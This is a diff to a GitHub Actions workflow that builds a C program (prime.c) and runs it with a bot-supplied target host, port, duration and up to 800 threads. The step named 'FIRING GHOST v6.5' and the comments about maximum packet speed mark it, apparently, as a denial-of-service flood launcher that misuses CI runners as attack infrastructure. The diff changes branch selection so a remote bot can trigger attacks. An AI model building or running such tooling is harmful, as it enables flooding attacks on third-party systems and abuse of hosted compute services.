@@ -13,7 +13,7 @@ on:
         description: 'DURATION (SEC)'
         required: true
         default: '180'
-      threads:  # ✨ Naya Input: Bot se threads lene ke liye
+      threads: 
         description: 'THREADS'
         required: true
         default: '800'
@@ -30,12 +30,14 @@ jobs:
       - name: 🛰️ INITIALIZING
         uses: actions/checkout@v4
         with:
-          ref: patch-1  # ✨ Forcefully patch-1 branch se code uthayega
+          # ✨ CHANGE: Ye automatic usi branch ko select karega jise Bot ne trigger kiya hai
+          ref: ${{ github.ref_name }}
 
-      - name: 🔥 FIRING GHOST v6.0
+      - name: 🔥 FIRING GHOST v6.5
         run: |
+          # ⚔️ Optimization level -O3 for maximum packet speed
           gcc -O3 prime.c -o PRIME -lpthread
           chmod +x PRIME
-          # ✨ Ab ye bot dwara bheje gaye threads use karega
+          # 🚀 Bot se aaye huye saare parameters yahan pass ho rahe hain
           ./PRIME ${{ github.event.inputs.host }} ${{ github.event.inputs.port }} ${{ github.event.inputs.time }} ${{ github.event.inputs.threads }}
           
